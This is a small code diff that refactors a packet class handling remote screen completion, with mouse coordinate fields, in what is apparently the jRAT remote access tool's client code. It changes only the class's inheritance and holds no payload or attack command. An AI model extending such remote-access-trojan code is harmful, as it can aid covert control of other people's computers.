@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet68RemoteScreenComplete extends AbstractOutgoingPacket {
+public class Packet68RemoteScreenComplete implements OutgoingPacket {
 
 	private int mouseX;
 	private int mouseY;
